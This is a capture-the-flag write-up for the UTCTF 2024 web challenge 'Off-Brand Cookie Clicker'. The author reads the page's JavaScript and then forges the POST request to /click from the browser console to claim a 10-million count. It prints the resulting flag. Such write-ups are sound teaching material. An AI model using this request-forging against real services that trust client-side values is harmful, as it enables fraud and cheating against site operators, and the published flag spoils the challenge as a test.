---
title: "Off-Brand Cookie Clicker"
description: "I tried to make my own version of cookie clicker, without all of the extra fluff. Can you beat my highscore?"
pubDate: 2024-04-01
ctf: "UTCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-utctf/icon.png"
---

The website looks like this:

![cookie.png](images/24-utctf/cookie.png)

Now, I'm not clicking to 10 million cookies, so let's look at how it checks for this.

In the `head` there is a `script` that has the following:
```js
document.addEventListener('DOMContentLoaded', function() {
    var count = parseInt(localStorage.getItem('count')) || 0;
    var cookieImage = document.getElementById('cookieImage');
    var display = document.getElementById('clickCount');

    display.textContent = count;

    cookieImage.addEventListener('click', function() {
        count++;
        display.textContent = count;
        localStorage.setItem('count', count);

        if (count >= 10000000) {
            fetch('/click', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'count=' + count
            })
            .then(response => response.json())
            .then(data => {
                alert(data.flag);
            });
        }
    });
});
```

Let's just forge this request. So I copy the following portion into the console.
```js
fetch('/click', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'count=10000000'
})
.then(response => response.json())
.then(data => {
    alert(data.flag);
});
```

`Wow, you beat me. Congrats! utflag{y0u_cl1ck_pr3tty_f4st}`

Flag: `utflag{y0u_cl1ck_pr3tty_f4st}`